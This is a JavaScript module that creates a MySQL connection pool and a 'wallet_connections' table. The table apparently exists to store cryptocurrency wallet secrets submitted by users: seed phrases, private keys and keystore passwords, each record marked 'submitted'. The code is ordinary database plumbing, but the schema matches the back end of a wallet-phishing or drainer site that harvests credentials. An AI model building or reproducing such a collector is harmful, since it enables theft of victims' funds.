import mysql from 'mysql2/promise';

// Database connection configuration
const dbConfig = {
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 3306,
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'sql5796694',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
};

// Create connection pool
const pool = mysql.createPool(dbConfig);

// Test database connection
export async function testConnection() {
  try {
    const connection = await pool.getConnection();
    console.log('MySQL database connected successfully');
    connection.release();
    return true;
  } catch (error) {
    console.error('Database connection failed:', error.message);
    console.error('Error details:', {
      code: error.code,
      errno: error.errno,
      sqlState: error.sqlState,
      sqlMessage: error.sqlMessage
    });
    return false;
  }
}

// Initialize database and create table if it doesn't exist
export async function initializeDatabase() {
  try {
    const connection = await pool.getConnection();
    
    // Create wallet_connections table
    await connection.execute(`
      CREATE TABLE IF NOT EXISTS wallet_connections (
        id VARCHAR(255) PRIMARY KEY,
        timestamp DATETIME NOT NULL,
        walletName VARCHAR(255) NOT NULL,
        connectionMethod VARCHAR(50) NOT NULL,
        status VARCHAR(50) DEFAULT 'submitted',
        phraseInput TEXT NULL,
        keystorePassword VARCHAR(255) NULL,
        privateKeyInput TEXT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    
    console.log('Database initialized successfully');
    connection.release();
    return true;
  } catch (error) {
    console.error('Database initialization failed:', error.message);
    return false;
  }
}

// Get connection from pool
export async function getConnection() {
  return await pool.getConnection();
}

// Execute query with parameters
export async function executeQuery(query, params = []) {
  try {
    const [rows] = await pool.execute(query, params);
    return rows;
  } catch (error) {
    console.error('Query execution error:', error.message);
    throw error;
  }
}

export default pool;
